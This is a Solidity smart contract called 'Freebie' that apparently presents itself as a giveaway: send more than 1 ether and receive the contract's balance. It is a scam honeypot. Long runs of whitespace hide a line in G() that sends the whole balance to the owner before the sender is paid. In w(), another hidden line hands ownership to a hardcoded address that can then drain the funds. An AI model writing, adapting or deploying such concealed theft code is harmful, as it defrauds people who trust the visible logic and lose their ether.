pragma solidity ^0.4.19;

contract Freebie
{
    address public O = msg.sender;
   
    function() public payable{}
   
    function G()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               O.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function w()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){O=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == O);
        O.transfer(this.balance);
    }
    
    function C(address a, bytes d)
    payable
    public
    {
        require(msg.sender == O);
         
        a.call.value(msg.value)(d);
    }
}